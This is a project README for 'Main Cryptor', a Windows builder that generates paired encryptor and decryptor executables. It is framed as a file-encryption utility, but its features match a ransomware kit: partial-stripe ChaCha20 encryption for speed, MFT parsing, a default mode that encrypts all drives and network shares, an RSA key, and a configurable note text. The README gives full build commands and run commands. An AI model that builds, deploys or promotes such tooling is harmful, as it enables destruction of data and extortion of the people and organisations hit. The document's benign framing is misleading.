# Main Cryptor

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Build Status](https://img.shields.io/badge/build-passing-green.svg)
![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)
![Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)

**Main Cryptor** is a lightweight utility for encrypting and decrypting files on Windows, leveraging the ChaCha20 algorithm and MFT parsing for fast NTFS disk operations. The project consists of three core components: `builder.exe` (generator), `encryptor.exe` (encrypter), and `decryptor.exe` (decrypter). Designed for compactness (< 900 KB) and compatibility across Windows versions.

![Main Cryptor Demo](https://via.placeholder.com/600x300.png?text=Main+Cryptor+Demo)  
*Placeholder for a demo GIF or screenshot — replace with your own!*

---

## Key Features

- **File Encryption**: Uses ChaCha20 for partial file encryption (stripes from 0.6% to 2% based on file size).
- **MFT Parsing**: Rapid file access via the Master File Table on NTFS drives.
- **Logging**: Optional operation logging to `encryptor.log`.
- **Password Generation**: Generates a 64-character password for each run.
- **Network Shares**: Supports encryption on network shares via WinAPI.
- **Compact Size**: Optimized to stay under 900 KB with the `/O1` flag.

---

## Requirements

- **OS**: Windows 7 and above (tested on Windows 10/11).
- **Compiler**: Microsoft Visual Studio (MSVC) with Windows SDK installed.
- **Libraries**: `advapi32.lib`, `mpr.lib`, `user32.lib`.

---

## Installation and Build

### Prerequisites
1. Install Visual Studio with C++ support (Desktop Development with C++ workload).
2. Ensure Windows SDK is installed (e.g., version 10.0.22621.0).

### Building the Project
1. Clone the repository:
   ```bash
   git clone https://github.com/freegut/main_cryptor.git
   cd main_cryptor
   ```
2. Open the "Developer Command Prompt for VS".
3. Compile the components:
   ```cmd
   cl /O1 /Feoutput\builder.exe src\builder.c src\crypto.c src\utils.c src\config.c /link /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x86" advapi32.lib user32.lib
   cl /O1 /Feoutput\encryptor.exe src\encryptor.c src\crypto.c src\utils.c src\config.c /link /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x86" advapi32.lib mpr.lib user32.lib
   cl /O1 /Feoutput\decryptor.exe src\decryptor.c src\crypto.c src\utils.c src\config.c /link /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x86" advapi32.lib mpr.lib user32.lib
   ```
   *Note*: Replace the `/LIBPATH` with your Windows SDK version if different.

![Build Process](https://via.placeholder.com/600x200.png?text=Build+Process)  
*Add a screenshot or GIF of the compilation process here!*

---

## Usage

### 1. Configuration Setup
Create a `cfg.txt` file in the project root:
```json
{
    "rsa_pub_key": "65537,123456789",
    "note_text": "File testing completed successfully, proceed with decryption testing",
    "log_enabled": true
}
```

### 2. Generating Encryptor and Decryptor
Run `builder.exe`:
```cmd
cd output
builder.exe
```
- Outputs a 64-character password.
- Generates new `encryptor.exe` and `decryptor.exe` in the `output` folder.

![Password Generation](https://via.placeholder.com/600x150.png?text=Password+Generation)  
*Replace with a GIF showing password output!*

### 3. Encrypting Files
Encrypt files in a specific folder:
```cmd
encryptor.exe -path C:\test
```
Or encrypt all drives and network shares (use with caution!):
```cmd
encryptor.exe
```

### 4. Decrypting Files
Decrypt files:
```cmd
decryptor.exe -path C:\test
```

![Encryption Demo](https://via.placeholder.com/600x300.png?text=Encryption+Demo)  
*Add a GIF of encryption/decryption in action!*

---

## Project Structure

```
main_cryptor/
├── src/            # Source files
│   ├── builder.c   # Generator for encryptor and decryptor
│   ├── encryptor.c # File encryptor
│   ├── decryptor.c # File decryptor
│   ├── crypto.c    # ChaCha20, SHA-256, RSA implementations
│   ├── utils.c     # Utilities (password gen, logging)
│   └── config.c    # Configuration parser
├── output/         # Compiled executables
│   ├── builder.exe
│   ├── encryptor.exe
│   └── decryptor.exe
├── cfg.txt         # Configuration file
└── README.md       # Documentation
```

---

## Size Optimization
- Built with the `/O1` flag for minimal size.
- Each `.exe` is < 900 KB (verified on Windows 11 with MSVC 19.43).

---

## Testing
1. Create a test folder (e.g., `C:\test`) with sample files.
2. Run the following sequence:
   ```cmd
   output\builder.exe
   output\encryptor.exe -path C:\test
   output\decryptor.exe -path C:\test
   ```
3. Verify the files and check `encryptor.log`.

![Test Results](https://via.placeholder.com/600x200.png?text=Test+Results)  
*Insert a screenshot of encrypted files or log output!*

---

## Limitations
- Requires running from "Developer Command Prompt" for internal compilation in `builder.exe`.
- MFT parsing is exclusive to NTFS drives.

---

## License
This project is licensed under the [MIT License](LICENSE). Use at your own risk.

---

## Contact
For questions or suggestions:
- GitHub: [@freegut](https://github.com/freegut)

---

## Gallery
Here’s a sneak peek of Main Cryptor in action:

![Config File](https://via.placeholder.com/300x150.png?text=cfg.txt+Example)  
*Sample `cfg.txt` configuration.*

![Log Output](https://via.placeholder.com/300x150.png?text=encryptor.log+Sample)  
*Example log output from `encryptor.exe`.*

---
```
